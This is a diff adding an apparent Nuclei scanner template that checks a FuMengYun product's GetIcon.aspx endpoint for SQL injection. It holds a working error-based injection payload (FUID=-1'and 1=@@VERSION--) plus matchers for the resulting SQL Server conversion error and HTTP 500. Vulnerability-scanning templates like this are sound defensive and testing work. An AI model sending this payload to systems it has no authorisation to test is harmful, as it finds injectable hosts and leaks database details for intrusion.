@@ -1,0 +1,27 @@
+id: FuMengYun-GetIcon-sqlInjection
+
+info:
+  name: FuMengYun-GetIcon-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    FuMengYun-GetIcon-sqlInjection
+
+http:
+  - raw:
+      - |
+        GET /Common/GetIcon.aspx?FUID=-1%27and+1=@@VERSION-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "nvarchar"
+          - "转换成数据类型"
+        condition: and
+
+      - type: status
+        status:
+          - 500
